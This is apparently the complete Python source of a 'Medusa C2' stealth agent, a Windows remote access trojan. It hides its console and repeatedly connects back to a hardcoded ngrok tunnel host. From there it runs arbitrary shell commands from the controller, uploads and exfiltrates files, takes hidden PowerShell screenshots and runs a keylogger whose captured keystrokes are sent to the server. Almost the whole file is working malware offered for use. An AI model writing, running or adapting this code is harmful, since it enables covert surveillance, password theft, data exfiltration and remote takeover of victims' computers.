"""
Medusa C2 - Stealth Agent (ZERO external dependencies)
Supports: shell, cd, screenshot, upload, download, keylogger
Runs hidden (no console window) on Windows.

Usage:
    python  test_agent.py [server_ip] [server_port]
    pythonw test_agent.py [server_ip] [server_port]   ← fully silent (no console at all)
"""
import socket
import subprocess
import os
import time
import sys
import platform
import base64
import threading
import ctypes

# ──────────────────────────────────────────────
# CONFIG
# ──────────────────────────────────────────────
SERVER_IP   = "0.tcp.in.ngrok.io"
SERVER_PORT = 20052
DELIMITER   = "<EOF>"

_NO_WINDOW = 0x08000000  # CREATE_NO_WINDOW


def hide_console():
    """Hide the console window so the agent runs invisibly."""
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)   # SW_HIDE
    except Exception:
        pass


# ══════════════════════════════════════════════
#  SCREENSHOT — Windows-native via PowerShell
#  No pyautogui / Pillow needed
# ══════════════════════════════════════════════
def take_screenshot():
    """
    Capture the primary screen using .NET via PowerShell.
    Returns a base64-encoded PNG string, or None on failure.
    """
    ps_script = (
        "Add-Type -AssemblyName System.Windows.Forms;"
        "Add-Type -AssemblyName System.Drawing;"
        "$s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;"
        "$b=New-Object System.Drawing.Bitmap($s.Width,$s.Height);"
        "$g=[System.Drawing.Graphics]::FromImage($b);"
        "$g.CopyFromScreen($s.Location,[System.Drawing.Point]::Empty,$s.Size);"
        "$m=New-Object System.IO.MemoryStream;"
        "$b.Save($m,[System.Drawing.Imaging.ImageFormat]::Png);"
        "$r=[Convert]::ToBase64String($m.ToArray());"
        "$g.Dispose();$b.Dispose();$m.Dispose();"
        "Write-Output $r"
    )
    try:
        result = subprocess.run(
            ["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", ps_script],
            capture_output=True, text=True, timeout=30,
            creationflags=_NO_WINDOW,
        )
        b64 = result.stdout.strip()
        if b64:
            return b64
        return None
    except Exception:
        return None


# ══════════════════════════════════════════════
#  KEYLOGGER — Windows-native via ctypes
#  No pynput needed
# ══════════════════════════════════════════════
keylog_buffer  = ""
logging_active = False
keylog_thread  = None

_SPECIAL_KEYS = {
    0x08: "[BS]",   0x09: "[TAB]",   0x0D: "\n",
    0x1B: "[ESC]",  0x14: "[CAPS]",  0x20: " ",
    0x25: "[LEFT]", 0x26: "[UP]",    0x27: "[RIGHT]", 0x28: "[DOWN]",
    0x2E: "[DEL]",  0x2D: "[INS]",
    0x21: "[PGUP]", 0x22: "[PGDN]", 0x23: "[END]", 0x24: "[HOME]",
    # Modifier keys — log nothing (they modify other keys)
    0x10: "", 0x11: "", 0x12: "",       # SHIFT, CTRL, ALT
    0xA0: "", 0xA1: "", 0xA2: "", 0xA3: "", 0xA4: "", 0xA5: "",
    0x5B: "", 0x5C: "",                  # LWIN, RWIN
}

def _keylogger_loop():
    """Poll every 10 ms for key-down events using GetAsyncKeyState."""
    global keylog_buffer, logging_active
    user32 = ctypes.windll.user32

    while logging_active:
        for vk in range(8, 256):
            # Bit 0 → key was pressed since last call to GetAsyncKeyState
            if user32.GetAsyncKeyState(vk) & 1:
                ch = _vk_to_char(vk, user32)
                if ch:
                    keylog_buffer += ch
        time.sleep(0.01)


def _vk_to_char(vk, user32):
    """Convert a virtual-key code to a printable string."""
    # 1) Special / modifier keys
    if vk in _SPECIAL_KEYS:
        return _SPECIAL_KEYS[vk]

    # 2) Function keys F1-F24
    if 0x70 <= vk <= 0x87:
        return f"[F{vk - 0x6F}]"

    # 3) Numpad 0-9
    if 0x60 <= vk <= 0x69:
        return chr(vk - 0x30)

    # 4) A-Z  (handle shift / capslock)
    if 0x41 <= vk <= 0x5A:
        shift = user32.GetAsyncKeyState(0x10) & 0x8000
        caps  = user32.GetKeyState(0x14) & 1
        if shift or caps:
            return chr(vk)          # uppercase
        return chr(vk + 32)        # lowercase

    # 5) 0-9 row (handle shift for symbols like !, @, # …)
    if 0x30 <= vk <= 0x39:
        shift = user32.GetAsyncKeyState(0x10) & 0x8000
        if shift:
            symbols = ")!@#$%^&*("
            return symbols[vk - 0x30]
        return chr(vk)

    # 6) Try Windows ToUnicode for everything else (OEM keys, punctuation…)
    try:
        scan  = user32.MapVirtualKeyW(vk, 0)
        state = (ctypes.c_ubyte * 256)()
        user32.GetKeyboardState(state)
        buf = (ctypes.c_wchar * 8)()
        ret = user32.ToUnicode(vk, scan, state, buf, 8, 0)
        if ret > 0:
            return buf.value
    except Exception:
        pass

    return ""


def start_keylogger():
    global logging_active, keylog_thread
    if logging_active:
        return "[*] Keylogger already running."
    logging_active = True
    keylog_thread = threading.Thread(target=_keylogger_loop, daemon=True)
    keylog_thread.start()
    return "[+] Keylogger started in background."


def stop_keylogger():
    global logging_active
    logging_active = False
    return "[-] Keylogger stopped."


def dump_keylog():
    global keylog_buffer
    if not keylog_buffer:
        return "[*] Keylog buffer is empty."
    data = keylog_buffer
    keylog_buffer = ""
    return f"[KEYLOG_DUMP]:\n{data}"


# ══════════════════════════════════════════════
#  NETWORKING
# ══════════════════════════════════════════════
def connect():
    """Keep trying to reach the C2 server."""
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_IP, SERVER_PORT))

            hostname = socket.gethostname()
            os_info  = f"{platform.system()} {platform.release()}"
            s.send(f"[INFO]:{hostname}:{os_info}".encode())
            return s
        except Exception:
            time.sleep(5)


def receive_commands(s):
    """Main command loop — read commands, dispatch, send results."""
    command_buffer = ""

    while True:
        try:
            chunk = s.recv(4096).decode()
            if not chunk:
                break

            command_buffer += chunk

            while "\n" in command_buffer:
                idx = command_buffer.find("\n")
                cmd = command_buffer[:idx].strip()
                command_buffer = command_buffer[idx + 1:]

                if not cmd:
                    continue

                # ── exit ──────────────────────────────
                if cmd == "exit":
                    s.close()
                    return

                # ── upload <filename> <b64data> ───────
                if cmd.startswith("upload"):
                    try:
                        _, fname, b64 = cmd.split(" ", 2)
                        with open(fname, "wb") as f:
                            f.write(base64.b64decode(b64))
                        _send(s, f"[+] File {fname} uploaded successfully.")
                    except Exception as e:
                        _send(s, f"[-] Upload failed: {e}")
                    continue

                # ── download <filename> ───────────────
                if cmd.startswith("download"):
                    try:
                        _, fname = cmd.split(" ", 1)
                        if os.path.exists(fname):
                            with open(fname, "rb") as f:
                                enc = base64.b64encode(f.read()).decode()
                            _send(s, f"[FILE]:{fname}:{enc}")
                        else:
                            _send(s, "[-] File not found.")
                    except Exception as e:
                        _send(s, f"[-] Download failed: {e}")
                    continue

                # ── cd <dir> ──────────────────────────
                if cmd.startswith("cd "):
                    try:
                        os.chdir(cmd[3:])
                        _send(s, f"[+] Changed directory to {os.getcwd()}")
                    except Exception as e:
                        _send(s, str(e))
                    continue

                # ── screenshot ────────────────────────
                if cmd == "screenshot":
                    try:
                        b64_img = take_screenshot()
                        if b64_img:
                            _send(s, f"[IMAGE]:{b64_img}")
                        else:
                            _send(s, "[-] Screenshot failed (no data).")
                    except Exception as e:
                        _send(s, f"[-] Screenshot error: {e}")
                    continue

                # ── keylogger ─────────────────────────
                if cmd == "keylog_start":
                    _send(s, start_keylogger())
                    continue
                if cmd == "keylog_dump":
                    _send(s, dump_keylog())
                    continue
                if cmd == "keylog_stop":
                    _send(s, stop_keylogger())
                    continue

                # ── shell command (fallback) ──────────
                try:
                    proc = subprocess.Popen(
                        cmd, shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        stdin=subprocess.PIPE,
                        creationflags=_NO_WINDOW,
                    )
                    out = proc.stdout.read() + proc.stderr.read()
                    txt = out.decode(errors="ignore")
                    if not txt:
                        txt = "[*] Command executed (no output)"
                    _send(s, txt)
                except Exception as e:
                    _send(s, f"[-] Error: {e}")

        except Exception:
            break


def _send(sock, msg):
    """Send a response back to the C2 server with the EOF delimiter."""
    sock.sendall(f"{msg}{DELIMITER}".encode())


# ══════════════════════════════════════════════
#  ENTRY POINT
# ══════════════════════════════════════════════
def main():
    hide_console()          # ← vanish immediately
    while True:
        s = connect()
        receive_commands(s)
        time.sleep(5)       # reconnect loop


if __name__ == "__main__":
    if len(sys.argv) > 2:
        SERVER_IP   = sys.argv[1]
        SERVER_PORT = int(sys.argv[2])
    elif len(sys.argv) > 1:
        SERVER_IP = sys.argv[1]
    main()
